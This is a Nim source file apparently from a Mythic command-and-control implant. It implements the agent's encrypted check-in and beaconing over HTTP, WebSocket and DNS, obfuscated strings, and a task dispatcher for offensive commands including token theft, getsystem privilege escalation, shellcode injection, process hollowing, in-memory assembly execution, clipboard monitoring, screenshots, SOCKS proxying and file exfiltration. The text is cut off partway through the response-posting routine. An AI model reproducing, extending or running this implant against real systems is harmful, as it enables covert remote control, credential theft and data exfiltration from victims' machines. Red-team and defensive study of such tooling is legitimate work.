import std/[json, random, os, base64, tables, times, strutils, strformat]
import config
import global_data
import profiles/http_profile
import profiles/websocket_profile
import profiles/httpx_profile
import profiles/dns_profile
import utils/sysinfo
import utils/mythic_responses
import utils/debug
import utils/strenc
import tasks/exit
import tasks/sleep
import tasks/ls
import tasks/download
import tasks/upload
import tasks/run
import tasks/whoami
import tasks/cat
import tasks/mkdir
import tasks/cp
import tasks/mv
import tasks/cd
import tasks/ps
import tasks/pwd
import tasks/rm
import tasks/pty
import tasks/socks
import tasks/rpfwd
import tasks/redirect
import tasks/getenv as taskGetenv

# Cross-platform commands
import tasks/portscan
import tasks/ifconfig
import tasks/netstat
import tasks/config as taskConfig
import tasks/pkill

# Windows-only commands
when defined(windows):
  import tasks/execute_assembly
  import tasks/inline_execute
  import tasks/powerpick
  import tasks/shinject
  import tasks/make_token
  import tasks/steal_token
  import tasks/rev2self
  import tasks/runas
  import tasks/getsystem
  import tasks/getprivs
  import tasks/listpipes
  import tasks/scshell
  import tasks/spawnto_x64
  import tasks/spawnto_x86
  import tasks/ppid
  import tasks/reg_query
  import tasks/reg_write_value
  import tasks/net_dclist
  import tasks/net_localgroup
  import tasks/net_localgroup_member
  import tasks/net_shares
  import tasks/screenshot
  import tasks/get_av
  import tasks/clipboard
  import tasks/clipboard_monitor
  import tasks/donut
  import tasks/inject_hollow

# Conditional imports for Windows-only features
when defined(windows):
  when defined(sleepObfuscationEkko):
    import utils/ekko

type
  BackgroundTaskType = enum
    btDownload, btUpload, btExecuteAssembly, btInlineExecute, btShinject, btDonut, btInjectHollow
  
  BackgroundTaskState = object
    taskType: BackgroundTaskType
    path: string
    fileId: string
    totalChunks: int
    currentChunk: int
    fileData: seq[byte]  # For execute-assembly file accumulation
    params: JsonNode  # Store original params for execute-assembly
  
  MonitoringTaskType* = enum
    mtClipboardMonitor, mtPortscan
  
  ProfileKind = enum
    pkHttp, pkWebSocket, pkHttpx, pkDns
  
  Profile = object
    case kind: ProfileKind
    of pkHttp:
      httpProfile: HttpProfile
    of pkWebSocket:
      wsProfile: WebSocketProfile
    of pkHttpx:
      httpxProfile: HttpxProfile
    of pkDns:
      dnsProfile: DnsProfile
  
  Agent* = ref object
    config: Config
    profile: Profile
    callbackUuid: string
    shouldExit*: bool
    sleepInterval: int
    jitter: int
    taskResponses: seq[JsonNode]
    backgroundTasks: Table[string, BackgroundTaskState]  # taskId -> state
    activeMonitoringTasks: Table[string, MonitoringTaskType]  # Task ID -> task type

# Profile helper procs
proc send(profile: var Profile, data: string, callbackUuid: string = ""): string =
  case profile.kind
  of pkHttp:
    result = profile.httpProfile.send(data, callbackUuid)
  of pkWebSocket:
    result = profile.wsProfile.send(data, callbackUuid)
  of pkHttpx:
    result = profile.httpxProfile.send(data, callbackUuid)
  of pkDns:
    result = profile.dnsProfile.send(data, callbackUuid)

proc setAesKey(profile: var Profile, key: seq[byte]) =
  case profile.kind
  of pkHttp:
    profile.httpProfile.setAesKey(key)
  of pkWebSocket:
    profile.wsProfile.setAesKey(key)
  of pkHttpx:
    profile.httpxProfile.setAesKey(key)
  of pkDns:
    profile.dnsProfile.setAesKey(key)

proc setAesDecKey(profile: var Profile, key: seq[byte]) =
  case profile.kind
  of pkHttp:
    profile.httpProfile.setAesDecKey(key)
  of pkWebSocket:
    profile.wsProfile.setAesDecKey(key)
  of pkHttpx:
    profile.httpxProfile.setAesDecKey(key)
  of pkDns:
    profile.dnsProfile.setAesDecKey(key)

proc hasAesKey(profile: Profile): bool =
  case profile.kind
  of pkHttp:
    result = profile.httpProfile.hasAesKey()
  of pkWebSocket:
    result = profile.wsProfile.hasAesKey()
  of pkHttpx:
    result = profile.httpxProfile.hasAesKey()
  of pkDns:
    result = profile.dnsProfile.hasAesKey()

proc performKeyExchange(profile: var Profile): tuple[success: bool, newUuid: string] =
  case profile.kind
  of pkHttp:
    result = profile.httpProfile.performKeyExchange()
  of pkWebSocket:
    result = profile.wsProfile.performKeyExchange()
  of pkHttpx:
    result = profile.httpxProfile.performKeyExchange()
  of pkDns:
    result = profile.dnsProfile.performKeyExchange()

proc newAgent*(): Agent =
  ## Create a new agent instance
  result = Agent()
  result.activeMonitoringTasks = initTable[string, MonitoringTaskType]()
  result.config = getConfig()
  # Initialize global data storage
  initGlobalData()
  
  debug &"[DEBUG] Agent: Initializing profile ({result.config.profile})..."
  
  # Initialize the correct profile based on config
  case result.config.profile
  of "websocket":
    result.profile = Profile(kind: pkWebSocket, wsProfile: newWebSocketProfile())
  of "httpx":
    result.profile = Profile(kind: pkHttpx, httpxProfile: newHttpxProfile())
  of "dns":
    result.profile = Profile(kind: pkDns, dnsProfile: newDnsProfile())
  else:  # Default to HTTP for "http" or any other value
    result.profile = Profile(kind: pkHttp, httpProfile: newHttpProfile())
  
  debug "[DEBUG] Agent: Profile initialized successfully"
  
  result.callbackUuid = result.config.uuid  # Initialize with payload UUID
  result.shouldExit = false
  result.sleepInterval = result.config.callbackInterval
  result.jitter = result.config.callbackJitter
  result.taskResponses = @[]
  result.backgroundTasks = initTable[string, BackgroundTaskState]()
  
  debug "[DEBUG] Agent: Parsing AESPSK configuration..."
  
  # If AESPSK is configured, parse and set it
  # Note: For RSA mode, AESPSK is used temporarily for staging_rsa, then replaced by session key
  # For AESPSK-only mode (encryptedExchange=false), AESPSK is used for all communications
  if result.config.aesKey.len > 0:
    try:
      # AESPSK is a JSON string like: {"dec_key": "...", "enc_key": "...", "value": "aes256_hmac"}
      # enc_key: used for agent → server encryption
      # dec_key: used for server → agent decryption
      let aespskJson = parseJson(result.config.aesKey)
      let encKeyB64 = aespskJson["enc_key"].getStr()
      let decKeyB64 = aespskJson["dec_key"].getStr()
      let encKeyBytes = cast[seq[byte]](decode(encKeyB64))
      let decKeyBytes = cast[seq[byte]](decode(decKeyB64))
      result.profile.setAesKey(encKeyBytes)     # for encryption
      result.profile.setAesDecKey(decKeyBytes)  # for decryption
      if result.config.encryptedExchange:
        debug "[DEBUG] AESPSK loaded for RSA staging (will be replaced by session key after key exchange)"
      else:
        debug "[DEBUG] AESPSK detected - using pre-shared AES key (no RSA exchange)"
    except:
      debug "[DEBUG] Failed to parse AESPSK: " & getCurrentExceptionMsg()
  else:
    debug "[DEBUG] Agent: No AESPSK configured"
  
  debug "[DEBUG] Agent: Initialization complete"

proc buildCheckinMessage(): JsonNode =
  ## Build the initial checkin message
  let sysInfo = getSystemInfo()
  let cfg = getConfig()
  
  result = %*{
    obf("action"): obf("checkin"),
    obf("uuid"): cfg.uuid,
    obf("ips"): sysInfo.ips,
    obf("os"): sysInfo.os,
    obf("user"): sysInfo.user,
    obf("host"): sysInfo.hostname,
    obf("pid"): sysInfo.pid,
    obf("architecture"): sysInfo.arch,
    obf("domain"): sysInfo.domain,
    obf("integrity_level"): sysInfo.integrityLevel,
    obf("process_name"): sysInfo.processName,
    obf("cwd"): sysInfo.cwd,
    obf("impersonation_context"): nil
  }
  
proc checkin*(agent: Agent): bool =
  ## Perform initial checkin with Mythic
  debug "[DEBUG] Starting checkin..."
  
  # Perform RSA key exchange if enabled (regardless of whether AESPSK is set)
  # AESPSK is used to encrypt the staging_rsa message, then replaced with session key
  if agent.config.encryptedExchange:
    debug "[DEBUG] RSA key exchange enabled - performing key exchange..."
    let (success, newUuid) = agent.profile.performKeyExchange()
    if not success:
      debug "[DEBUG] Key exchange failed"
      return false
    # Update callback UUID if server provided one
    if newUuid.len > 0:
      debug "[DEBUG] Updating callback UUID from " & agent.callbackUuid & " to " & newUuid
      agent.callbackUuid = newUuid
  
  # Build and send checkin
  let checkinMsg = buildCheckinMessage()
  let checkinStr = $checkinMsg
  
  debug "[DEBUG] Checkin message: " & checkinStr
  
  let response = agent.profile.send(checkinStr, agent.callbackUuid)
  
  if response.len == 0:
    debug "[DEBUG] Checkin failed - empty response"
    return false
  
  try:
    let respJson = parseJson(response)
    if respJson.hasKey("status") and respJson["status"].getStr() == "success":
      # Update callback UUID from server response
      let newCallbackUuid = respJson["id"].getStr()
      debug "[DEBUG] Checkin successful, updating callback UUID from " & agent.callbackUuid & " to " & newCallbackUuid
      agent.callbackUuid = newCallbackUuid
      return true
  except:
    debug "[DEBUG] Failed to parse checkin response: " & getCurrentExceptionMsg()
  
  return false

proc getTasks*(agent: var Agent): tuple[tasks: seq[JsonNode], interactive: seq[JsonNode], socks: seq[JsonNode], rpfwd: seq[JsonNode]] =
  ## Get tasking from Mythic
  ## Returns tasks, interactive messages, socks messages, and rpfwd messages
  ## Also updates agent.callbackUuid if a delayed checkin response is received
  let getTaskingMsg = %*{
    obf("action"): obf("get_tasking"),
    obf("tasking_size"): -1
  }
  
  debug "[DEBUG] Sending get_tasking with UUID: ", agent.callbackUuid
  let response = agent.profile.send($getTaskingMsg, agent.callbackUuid)
  
  debug "[DEBUG] get_tasking response length: ", response.len, " bytes"
  if response.len > 0 and response.len < 200:
    debug "[DEBUG] get_tasking response: ", response
  
  if response.len == 0:
    return (@[], @[], @[], @[])
  
  var tasks: seq[JsonNode] = @[]
  var interactive: seq[JsonNode] = @[]
  var socks: seq[JsonNode] = @[]
  var rpfwd: seq[JsonNode] = @[]
  
  try:
    let respJson = parseJson(response)
    
    # Check if this is a delayed checkin response (contains "id" field with callback UUID)
    # This happens with DNS C2 when the server queues the checkin response
    if respJson.hasKey(obf("id")) and respJson.hasKey(obf("status")):
      if respJson[obf("status")].getStr() == obf("success"):
        let newCallbackUuid = respJson[obf("id")].getStr()
        if newCallbackUuid != agent.callbackUuid:
          debug "[DEBUG] Received delayed checkin response - updating callback UUID from ", agent.callbackUuid, " to ", newCallbackUuid
          agent.callbackUuid = newCallbackUuid
    
    if respJson.hasKey(obf("tasks")):
      tasks = respJson[obf("tasks")].getElems()
      debug "[DEBUG] Received " & $tasks.len & " task(s)"
    
    if respJson.hasKey(obf("interactive")):
      interactive = respJson[obf("interactive")].getElems()
      debug "[DEBUG] Received " & $interactive.len & " interactive message(s)"
    
    if respJson.hasKey(obf("socks")):
      socks = respJson[obf("socks")].getElems()
      debug "[DEBUG] Received " & $socks.len & " socks message(s)"
    
    if respJson.hasKey(obf("rpfwd")):
      rpfwd = respJson[obf("rpfwd")].getElems()
      debug "[DEBUG] Received " & $rpfwd.len & " rpfwd message(s)"
    
    return (tasks, interactive, socks, rpfwd)
  except:
    debug "[DEBUG] Failed to parse tasking: " & getCurrentExceptionMsg()
    return (@[], @[], @[], @[])



proc processInteractive*(agent: var Agent, interactive: seq[JsonNode]) =
  ## Process interactive messages (PTY input from Mythic)
  for msg in interactive:
    let taskId = msg[obf("task_id")].getStr()
    debug "[DEBUG] Processing interactive message for task " & taskId
    
    # Create array with single message for handler
    let response = handlePtyInteractive(taskId, @[msg])
    if response.len > 0:
      agent.taskResponses.add(response)

proc processSocks*(agent: var Agent, socksMessages: seq[JsonNode]) =
  ## Process SOCKS messages (data forwarding from Mythic)
  if socksMessages.len > 0:
    debug "[DEBUG] Processing " & $socksMessages.len & " SOCKS message(s)"
    
    # Handle all SOCKS messages and get responses to send back
    let responses = handleSocksMessages(socksMessages)
    for response in responses:
      # Wrap each SOCKS message in the format expected by postResponses
      agent.taskResponses.add(%*{obf("socks"): [response]})

proc processRpfwd*(agent: var Agent, rpfwdMessages: seq[JsonNode]) =
  ## Process RPfwd messages (data forwarding from Mythic)
  if rpfwdMessages.len > 0:
    debug "[DEBUG] Processing " & $rpfwdMessages.len & " rpfwd message(s)"
    
    # Handle all RPfwd messages and get responses to send back
    let responses = handleRpfwdMessages(rpfwdMessages)
    for response in responses:
      # Wrap each RPfwd message in the format expected by postResponses
      agent.taskResponses.add(%*{obf("rpfwd"): [response]})

proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
  ## Process received tasks
  for task in tasks:
    let taskId = task[obf("id")].getStr()
    let command = task[obf("command")].getStr()
    
    # Check if this is a background task response (download/upload continuation)
    # These are forwarded to background threads in postResponses(), so skip here
    if command == obf("background_task"):
      debug "[DEBUG] Background task message (will be forwarded in postResponses): " & taskId
      continue
    
    # Parse parameters - Mythic sends it as a JSON string
    var params = newJObject()
    if task.hasKey(obf("parameters")):
      let paramStr = task[obf("parameters")].getStr()
      if paramStr.len > 0:
        try:
          params = parseJson(paramStr)
        except:
          debug "[DEBUG] Failed to parse parameters: " & paramStr
    
    debug "[DEBUG] === PROCESSING TASK ==="
    debug "[DEBUG] Task ID: " & taskId
    debug "[DEBUG] Command: " & command
    if params.len > 0:
      debug "[DEBUG] Parameters: " & params.pretty()
    else:
      debug "[DEBUG] No parameters"
    
    # Execute command and get response
    var response = %*{
      obf("task_id"): taskId,
      obf("user_output"): "Command '" & command & "' not yet implemented",
      obf("completed"): true,
      obf("status"): "error"
    }
    
    try:
      case command
      of obf("exit"):
        debug "[DEBUG] Executing exit command"
        response = executeExit(params)
        response[obf("task_id")] = %taskId
        agent.shouldExit = true
        
      of obf("sleep"):
        debug "[DEBUG] Executing sleep command"
        response = executeSleep(params, agent.sleepInterval, agent.jitter)
        response[obf("task_id")] = %taskId
        
      of obf("ls"):
        debug "[DEBUG] Executing ls command"
        let lsResult = executeLs(params)
        # ls returns file browser format, need to wrap for task response
        if lsResult.hasKey(obf("files")):
          # This is a successful file browser response
          # Mythic expects it in "file_browser" field
          response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): obf("completed"),
            obf("file_browser"): lsResult,
            obf("user_output"): $lsResult  # Also include as serialized JSON string
          }
          debug "[DEBUG] Ls found " & $lsResult["files"].len & " files"
        else:
          # This is an error response, already has user_output
          response = lsResult
          response[obf("task_id")] = %taskId
          debug "[DEBUG] Ls returned error: " & response["user_output"].getStr()
      
      of obf("download"):
        debug "[DEBUG] Starting download"
        response = executeDownload(taskId, params)
        agent.taskResponses.add(response)
        
        # Track as background task for chunk handling
        var state = BackgroundTaskState(
          taskType: btDownload,
          path: params[obf("path")].getStr(),
          fileId: "",  # Will be set when we receive it from Mythic
          totalChunks: response[obf("download")][obf("total_chunks")].getInt(),
          currentChunk: 0
        )
        agent.backgroundTasks[taskId] = state
        continue
      
      of obf("upload"):
        debug "[DEBUG] Starting upload"
        response = executeUpload(taskId, params)
        agent.taskResponses.add(response)
        
        # Track as background task for chunk handling
        # Extract the full_path from the response which contains the computed UNC path
        let uploadPath = if response.hasKey(obf("upload")):
          response[obf("upload")][obf("full_path")].getStr()
        else:
          params[obf("remote_path")].getStr()
        
        var state = BackgroundTaskState(
          taskType: btUpload,
          path: uploadPath,
          fileId: params[obf("file")].getStr(),
          totalChunks: 0,  # Will be set when we receive first chunk
          currentChunk: 1
        )
        agent.backgroundTasks[taskId] = state
        continue
      
      of obf("execute_assembly"):
        when defined(windows):
          debug "[DEBUG] Starting execute-assembly (file download)"
          response = executeAssembly(taskId, params)
          agent.taskResponses.add(response)
          
          # Track as background task for file download
          var state = BackgroundTaskState(
            taskType: btExecuteAssembly,
            path: "",
            fileId: params[obf("uuid")].getStr(),
            totalChunks: 0,  # Will be set when we receive first chunk
            currentChunk: 1,
            fileData: @[],
            params: params
          )
          agent.backgroundTasks[taskId] = state
          continue
        else:
          response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("execute_assembly command is only available on Windows")
          }
      
      of obf("inline_execute"):
        when defined(windows):
          debug "[DEBUG] Starting inline_execute (BOF download)"
          response = inlineExecute(taskId, params)
          agent.taskResponses.add(response)
          
          # Track as background task for file download
          var state = BackgroundTaskState(
            taskType: btInlineExecute,
            path: "",
            fileId: params[obf("uuid")].getStr(),
            totalChunks: 0,  # Will be set when we receive first chunk
            currentChunk: 1,
            fileData: @[],
            params: params
          )
          agent.backgroundTasks[taskId] = state
          continue
        else:
          response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("inline_execute command is only available on Windows")
          }
      
      of obf("powerpick"):
        when defined(windows):
          debug "[DEBUG] Executing powerpick command"
          response = powerpick(taskId, params)
          response[obf("task_id")] = %taskId
        else:
          response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("powerpick command is only available on Windows")
          }
      
      of obf("run"):
        debug "[DEBUG] Executing run command"
        response = run(taskId, params)
        response[obf("task_id")] = %taskId
      
      of obf("shell"):
        debug "[DEBUG] Executing shell command (alias for run)"
        response = run(taskId, params)
        response[obf("task_id")] = %taskId
      
      of obf("shinject"):
        when defined(windows):
          debug "[DEBUG] Starting shinject (shellcode download)"
          response = shinject(taskId, params)
          agent.taskResponses.add(response)
          
          # Track as background task for file download
          var state = BackgroundTaskState(
            taskType: btShinject,
            path: "",
            fileId: params[obf("uuid")].getStr(),
            totalChunks: 0,
            currentChunk: 1,
            fileData: @[],
            params: params
          )
          agent.backgroundTasks[taskId] = state
          continue
        else:
          response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("shinject command is only available on Windows")
          }
      
      of obf("whoami"):
        debug "[DEBUG] Executing whoami command"
        response = whoami(taskId, $params)
      
      of obf("cat"):
        debug "[DEBUG] Executing cat command"
        response = catFile(taskId, $params)
      
      of obf("mkdir"):
        debug "[DEBUG] Executing mkdir command"
        response = makeDirectory(taskId, $params)
      
      of obf("cp"):
        debug "[DEBUG] Executing cp command"
        response = cpFile(taskId, $params)
      
      of obf("mv"):
        debug "[DEBUG] Executing mv command"
        response = mvFile(taskId, $params)
      
      of obf("cd"):
        debug "[DEBUG] Executing cd command"
        response = changeDirectory(taskId, $params)
      
      of obf("ps"):
        debug "[DEBUG] Executing ps command"
        response = ps($params)
        response[obf("task_id")] = %taskId
      
      of obf("pwd"):
        debug "[DEBUG] Executing pwd command"
        response = pwd(taskId, params)
      
      of obf("rm"):
        debug "[DEBUG] Executing rm command"
        response = rm(taskId, params)
      
      of obf("pty"):
        debug "[DEBUG] Executing pty command"
        response = pty(taskId, params)
        # PTY sessions don't complete immediately
        if response.hasKey(obf("status")) and response[obf("status")].getStr() == obf("processing"):
          agent.taskResponses.add(response)
          continue
      
      of obf("make_token"):
        when defined(windows):
          debug "[DEBUG] Executing make_token command"
          response = makeToken(taskId, params)
        else:
          response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("make_token command is only available on Windows")
          }
      
      of obf("steal_token"):
        when defined(windows):
          debug "[DEBUG] Executing steal_token command"
          response = stealToken(taskId, params)
        else:
          response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("steal_token command is only available on Windows")
          }
      
      of obf("rev2self"):
        when defined(windows):
          debug "[DEBUG] Executing rev2self command"
          response = rev2self(taskId, params)
        else:
          response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("rev2self command is only available on Windows")
          }
      
      of obf("runas"):
        when defined(windows):
          debug "[DEBUG] Executing runas command"
          response = runas(taskId, params)
        else:
          response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("runas command is only available on Windows")
          }
      
      of obf("getsystem"):
        when defined(windows):
          debug "[DEBUG] Executing getsystem command"
          response = getsystem(taskId, params)
        else:
          response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("getsystem command is only available on Windows")
          }
      
      of obf("getprivs"):
        when defined(windows):
          debug "[DEBUG] Executing getprivs command"
          response = getprivs(taskId, params)
        else:
          response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("getprivs command is only available on Windows")
          }
      
      of obf("getenv"):
        debug "[DEBUG] Executing getenv command"
        response = taskGetenv.getenv(taskId, params)
      
      of obf("listpipes"):
        when defined(windows):
          debug "[DEBUG] Executing listpipes command"
          response = listpipes(taskId, params)
        else:
          response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("listpipes command is only available on Windows")
          }
      
      of obf("ifconfig"):
        debug "[DEBUG] Executing ifconfig command"
        response = ifconfig(taskId, params)
      
      of obf("netstat"):
        debug "[DEBUG] Executing netstat command"
        response = netstat(taskId, params)
      
      of obf("scshell"):
        when defined(windows):
          debug "[DEBUG] Executing scshell command"
          response = scshell(taskId, params)
        else:
          response = mythicError(taskId, obf("scshell is only available on Windows"))
      
      of obf("config"):
        debug "[DEBUG] Executing config command"
        response = taskConfig.config(taskId, params)
      
      of obf("pkill"):
        debug "[DEBUG] Executing pkill command"
        response = pkill(taskId, params)
      
      of obf("spawnto_x64"):
        when defined(windows):
          debug "[DEBUG] Executing spawnto_x64 command"
          response = spawnto_x64(taskId, params)
        else:
          response = mythicError(taskId, obf("spawnto_x64 is only available on Windows"))
      
      of obf("spawnto_x86"):
        when defined(windows):
          debug "[DEBUG] Executing spawnto_x86 command"
          response = spawnto_x86(taskId, params)
        else:
          response = mythicError(taskId, obf("spawnto_x86 is only available on Windows"))
      
      of obf("ppid"):
        when defined(windows):
          debug "[DEBUG] Executing ppid command"
          response = ppid(taskId, params)
        else:
          response = mythicError(taskId, obf("ppid is only available on Windows"))
      
      of obf("reg_query"):
        when defined(windows):
          debug "[DEBUG] Executing reg_query command"
          response = regQuery(taskId, params)
        else:
          response = mythicError(taskId, obf("reg_query is only available on Windows"))
      
      of obf("reg_write_value"):
        when defined(windows):
          debug "[DEBUG] Executing reg_write_value command"
          response = regWriteValue(taskId, params)
        else:
          response = mythicError(taskId, obf("reg_write_value is only available on Windows"))
      
      of obf("net_dclist"):
        when defined(windows):
          debug "[DEBUG] Executing net_dclist command"
          response = netDclist(taskId, params)
        else:
          response = mythicError(taskId, obf("net_dclist is only available on Windows"))
      
      of obf("net_localgroup"):
        when defined(windows):
          debug "[DEBUG] Executing net_localgroup command"
          response = netLocalgroup(taskId, params)
        else:
          response = mythicError(taskId, obf("net_localgroup is only available on Windows"))
      
      of obf("net_localgroup_member"):
        when defined(windows):
          debug "[DEBUG] Executing net_localgroup_member command"
          response = netLocalgroupMember(taskId, params)
        else:
          response = mythicError(taskId, obf("net_localgroup_member is only available on Windows"))
      
      of obf("net_shares"):
        when defined(windows):
          debug "[DEBUG] Executing net_shares command"
          response = netShares(taskId, params)
        else:
          response = mythicError(taskId, obf("net_shares is only available on Windows"))
      
      of obf("get_av"):
        when defined(windows):
          debug "[DEBUG] Executing get_av command"
          response = getAv(taskId, params)
        else:
          response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("get_av command is only available on Windows")
          }
      
      of obf("screenshot"):
        when defined(windows):
          debug "[DEBUG] Starting screenshot capture"
          response = screenshot(taskId, params)
          if response.hasKey(obf("download")):
            # This is a background task - store screenshot data for chunking
            agent.taskResponses.add(response)
            
            # Track as background task
            let decodedStr = decode(response[obf("screenshot_data")].getStr())
            var dataBytes = newSeq[byte](decodedStr.len)
            for i in 0..<decodedStr.len:
              dataBytes[i] = decodedStr[i].byte
            
            var state = BackgroundTaskState(
              taskType: btDownload,  # Reuse download for screenshots
              path: obf("screenshot.bmp"),
              fileId: "",
              totalChunks: response[obf("download")][obf("total_chunks")].getInt(),
              currentChunk: 0,
              fileData: dataBytes
            )
            agent.backgroundTasks[taskId] = state
            response.delete(obf("screenshot_data"))  # Don't send raw data to Mythic
            continue
        else:
          # Windows-only command on non-Windows platform
          response = %*{
            obf("task_id"): taskId,
            obf("user_output"): obf("screenshot command is only available on Windows"),
            obf("completed"): true,
            obf("status"): "error"
          }
      
      of obf("socks"):
        debug "[DEBUG] Executing socks command"
        response = socks(taskId, params)
        # SOCKS sessions don't complete immediately
        if response.hasKey(obf("status")) and response[obf("status")].getStr() == obf("processing"):
          agent.taskResponses.add(response)
          continue
      
      of obf("rpfwd"):
        debug "[DEBUG] Executing rpfwd command"
        response = rpfwd(taskId, params)
        # RPfwd sessions don't complete immediately
        if response.hasKey(obf("status")) and response[obf("status")].getStr() == obf("processing"):
          agent.taskResponses.add(response)
          continue
      
      of obf("redirect"):
        debug "[DEBUG] Executing redirect command"
        response = redirect(taskId, params)
        # Redirect completes immediately (runs entirely in background threads)
      
      of obf("portscan"):
        debug "[DEBUG] Starting portscan (background task)"
        response = portscan(taskId, params)
        # Track as background task if processing
        if response.hasKey(obf("status")) and response[obf("status")].getStr() == obf("processing"):
          agent.activeMonitoringTasks[taskId] = mtPortscan
          agent.taskResponses.add(response)
          continue
      
      of obf("clipboard"):
        when defined(windows):
          debug "[DEBUG] Executing clipboard command"
          response = clipboard(taskId, params)
        else:
          response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("clipboard command is only available on Windows")
          }
      
      of obf("clipboard_monitor"):
        when defined(windows):
          debug "[DEBUG] Starting clipboard_monitor (background task)"
          response = clipboardMonitor(taskId, params)
          # Track as background task if processing
          if response.hasKey(obf("status")) and response[obf("status")].getStr() == obf("processing"):
            agent.activeMonitoringTasks[taskId] = mtClipboardMonitor
            agent.taskResponses.add(response)
            continue
        else:
          response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("clipboard_monitor command is only available on Windows")
          }
      
      of obf("donut"):
        when defined(windows):
          debug "[DEBUG] Starting donut execution"
          response = donut(taskId, params)
          agent.taskResponses.add(response)
          
          # Track as background task for file download
          var state = BackgroundTaskState(
            taskType: btDonut,
            path: "",
            fileId: params[obf("uuid")].getStr(),
            totalChunks: 0,
            currentChunk: 1,
            fileData: @[],
            params: params
          )
          agent.backgroundTasks[taskId] = state
          continue
        else:
          response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("donut command is only available on Windows")
          }
      
      of obf("inject_hollow"):
        when defined(windows):
          debug "[DEBUG] Starting inject_hollow"
          response = injectHollow(taskId, params)
          agent.taskResponses.add(response)
          
          # Track as background task for file download
          var state = BackgroundTaskState(
            taskType: btInjectHollow,
            path: "",
            fileId: params[obf("uuid")].getStr(),
            totalChunks: 0,
            currentChunk: 1,
            fileData: @[],
            params: params
          )
          agent.backgroundTasks[taskId] = state
          continue
        else:
          response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("inject_hollow command is only available on Windows")
          }
      
      else:
        # Command not implemented
        debug "[DEBUG] Command not implemented: " & command
    
    except Exception as e:
      debug "[DEBUG] Task execution error: " & e.msg
      response = %*{
        obf("task_id"): taskId,
        obf("user_output"): "Error executing command: " & e.msg,
        obf("completed"): true,
        obf("status"): "error"
      }
    
    if response.hasKey(obf("status")):
      debug "[DEBUG] Task result status: ", response["status"].getStr()
    if response.hasKey(obf("user_output")):
      let output = response[obf("user_output")].getStr()
      if output.len < 200:
        debug "[DEBUG] Task output: ", output
      else:
        debug "[DEBUG] Task output length: ", output.len, " bytes (first 100 chars): ", output[0..<min(100, output.len)]
    
    agent.taskResponses.add(response)

proc checkBackgroundTasks*(agent: var Agent) =
  ## Check all active monitoring tasks (clipboard_monitor, portscan)
  ## This gets called every loop iteration to keep background tasks responsive
  var completedTasks: seq[string] = @[]
  
  for taskId, taskType in agent.activeMonitoringTasks:
    var result: JsonNode = nil
    
    case taskType
    of mtClipboardMonitor:
      when defined(windows):
        result = checkClipboardMonitor(taskId)
    of mtPortscan:
      result = checkPortscan(taskId)
    
    if result != nil:
      agent.taskResponses.add(result)
      # If completed, mark for removal
      if result.hasKey(obf("completed")) and result[obf("completed")].getBool():
        completedTasks.add(taskId)
  
  # Remove completed tasks
  for taskId in completedTasks:
    agent.activeMonitoringTasks.del(taskId)

proc postResponses*(agent: var Agent) =
  ## Post task responses back to Mythic
  if agent.taskResponses.len == 0:
    return
  
  debug "[DEBUG] === POSTING RESPONSES ==="
  debug "[DEBUG] Posting ", agent.taskResponses.len, " response(s)"
  
  # Separate interactive, socks, and rpfwd messages from regular responses
  var regularResponses: seq[JsonNode] = @[]
  var interactiveMessages: seq[JsonNode] = @[]
  var socksMessages: seq[JsonNode] = @[]
  var rpfwdMessages: seq[JsonNode] = @[]
  
  for resp in agent.taskResponses:
    if resp.hasKey(obf("interactive")):
      # Extract interactive messages and add to top-level array
      let taskId = resp[obf("task_id")].getStr()
      let messages = resp[obf("interactive")].getElems()
      for msg in messages:
        interactiveMessages.add(msg)
      
      # Don't add the response itself if it only has task_id and interactive
      # (i.e., it's purely for interactive messages)
      if resp.len > 2:  # More than just task_id and interactive
        var cleanResp = resp.copy()
        cleanResp.delete(obf("interactive"))
        regularResponses.add(cleanResp)
    elif resp.hasKey(obf("socks")):
      # Extract socks messages and add to top-level array
      let messages = resp[obf("socks")].getElems()
      for msg in messages:
        socksMessages.add(msg)
      # Don't add the socks wrapper to responses
    elif resp.hasKey(obf("rpfwd")):
      # Extract rpfwd messages and add to top-level array
      let messages = resp[obf("rpfwd")].getElems()
      for msg in messages:
        rpfwdMessages.add(msg)
      # Don't add the rpfwd wrapper to responses
    else:
      regularResponses.add(resp)
  
  # Build post_response message
  var postMsg = %*{
    obf("action"): obf("post_response"),
    obf("responses"): regularResponses
  }
  
  # Add interactive messages at top level if any
  if interactiveMessages.len > 0:
    postMsg[obf("interactive")] = %interactiveMessages
  
  # Add socks messages at top level if any
  if socksMessages.len > 0:
    postMsg[obf("socks")] = %socksMessages
  
  # Add rpfwd messages at top level if any
  if rpfwdMessages.len > 0:
    postMsg[obf("rpfwd")] = %rpfwdMessages
  
  let response = agent.profile.send($postMsg, agent.callbackUuid)
  
  debug "[DEBUG] Responses posted successfully"
  
  agent.taskResponses = @[]
  
  # Handle background task responses (file_id, chunks, etc.)
  if response.len > 0:
    try:
      let respJson = parseJson(response)
      if respJson.hasKey(obf("responses")):
